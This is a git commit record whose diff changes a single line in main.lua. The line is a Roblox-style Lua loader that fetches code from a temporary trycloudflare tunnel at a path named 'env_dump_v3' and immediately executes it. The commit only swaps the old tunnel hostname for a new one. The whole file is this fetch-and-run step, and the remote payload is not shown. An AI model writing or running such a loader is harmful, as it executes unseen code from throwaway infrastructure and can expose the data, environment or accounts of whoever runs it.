c60057d6153d12c99d7fd819e072b495c56a0ab0
Cipher <75399147+Cipher3569@users.noreply.github.com>
2026-09-09 14:15:48 -0400

    updated url

--- main.lua
+++ main.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://decorating-criticism-rosa-sector.trycloudflare.com/env_dump_v3"))()
+loadstring(game:HttpGet("https://towers-brought-trust-tone.trycloudflare.com/env_dump_v3"))()
